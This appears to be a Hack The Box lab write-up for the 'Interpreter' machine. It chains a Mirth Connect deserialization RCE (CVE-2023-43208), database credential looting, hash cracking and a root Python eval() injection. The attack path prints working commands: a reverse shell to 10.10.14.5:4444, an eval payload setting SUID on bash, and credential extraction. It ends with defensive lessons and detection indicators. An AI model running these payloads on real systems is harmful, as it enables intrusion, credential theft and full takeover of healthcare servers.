---
layout: default
title: "Interpreter"
parent: Medium Machines
grand_parent: Machines
permalink: /machines/medium/interpreter/
---

# Interpreter

![Machine Badge](https://img.shields.io/badge/Machine-Interpreter-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Season](https://img.shields.io/badge/Season-10%20Week%204-purple)

| Property | Value |
|----------|-------|
| **OS** | Linux (Debian 12) |
| **Difficulty** | Medium |
| **Release** | 2026-02-21 (Season 10, Week 4) |
| **Tags** | #mirth-connect #cve-2023-43208 #xstream #java-deserialization #python-eval #mysql |

---

## Summary

Interpreter exposes **NextGen Healthcare Mirth Connect** vulnerable to **CVE-2023-43208**, an unauthenticated Java deserialization RCE caused by XStream consuming attacker-controlled XML on `/api/users` with no class allowlist. Foothold lands as `mirth`. The Mirth installation properties expose MySQL credentials, where a stored hash cracks to SSH for a low-privileged user. A locally-bound (port 54321) root-owned Python HTTP service contains a Channel handler with a vulnerable `eval()`, yielding root.

---

## External Writeups

- [jimmexploit - HTB Season 10 Interpreter](https://www.jimmexploit.blog/blog/htb-season-10-interpreter-writeup)
- [1337 Sheets - Interpreter Medium (Feb 21, 2026)](https://1337sheets.com/hack-the-box-season-ten-htb-interpreter-writeup-medium-weekly-february-twenty-first/)
- [GitHub: CyberWarrior9 - Interpreter walkthrough](https://github.com/CyberWarrior9/HTB-Walkthroughs/blob/main/Interpreter/interpreter_writeup.md)
- [CyberSecGuru: Mastering Interpreter](https://thecybersecguru.com/ctf-walkthroughs/mastering-interpreter-beginners-guide-from-hackthebox/)
- [The Pentesting Ninja (Protected)](https://blog.thepentesting.ninja/protected/htb-interpreter/)
- [HTB Interpreter Writeup - YouTube](https://www.youtube.com/watch?v=RJVJSPv_zf0)

---

## Key Techniques

- **CVE-2023-43208**: Mirth Connect pre-auth RCE via XStream deserialization
- Commons Collections gadget chain in XStream payload
- `mirth.properties` plaintext DB credentials
- MySQL hash extraction + offline cracking
- Localhost-bound root service enumeration
- Python `eval()` injection on user-controlled input
- Privilege escalation via in-process command execution

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC interpreter.htb
# 22/tcp   ssh
# 8080/tcp http  - Mirth Connect 4.4.0
# 8443/tcp https - Mirth Connect REST API
```

### 2. CVE-2023-43208 - Pre-Auth RCE

`/api/users` accepts XML and deserializes via XStream without a whitelist. Public PoC:

```bash
git clone https://github.com/IHTeam-Sec/MirthRCE && cd MirthRCE
python3 exploit.py -t https://interpreter.htb:8443 \
  -c "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

Listener returns shell as `mirth`.

### 3. Lateral Movement

```bash
grep -i 'database.*password\|database.url' /opt/mirthconnect/conf/mirth.properties
# database.url = jdbc:mysql://localhost:3306/mirthdb
# database.password = <plaintext>

mysql -u mirth -p mirthdb -e "SELECT name, password FROM users;"
```

The stored hash format is salt-bracketed; crack with hashcat (Mirth uses PBKDF2-SHA256). Resulting cleartext is a password reused by a local user - SSH as that user.

### 4. Root via Python eval()

Enumerate root-owned localhost services:

```bash
ss -ltnp | grep 'LISTEN.*127.0.0.1'
# 127.0.0.1:54321  python3 ... notif.py
```

`notif.py` runs as root and parses a JSON body. The handler calls `eval(payload['filter'])` (or similar). Inject:

```bash
curl -s http://127.0.0.1:54321/notify \
  -H 'Content-Type: application/json' \
  -d '{"filter":"__import__(\"os\").system(\"chmod +s /bin/bash\")"}'

/bin/bash -p
# euid=0
```

---

## Lessons Learned

- XStream-based deserialization is a serial offender (Mirth, Jenkins, OFBiz). Always check for unpatched versions when you see Java app servers.
- Mirth Connect `mirth.properties` is a classic post-foothold loot file.
- Localhost-only services are not safe just because they aren't externally bound - any user-context shell can reach them.
- `eval()` on JSON / query fields remains one of the highest-impact one-liners; greybox audits should grep `\beval\b\(` aggressively.

---

## Indicators / Detection

- Mirth `/api/users` POST with `Content-Type: application/xml` and a body containing `org.apache.commons.collections` or `ProcessBuilder` markers.
- `mirth` user spawning `bash -i` or non-Java child processes.
- Root-owned Python service receiving JSON with backslash escapes around `__import__`, `eval`, `exec`, `compile`.
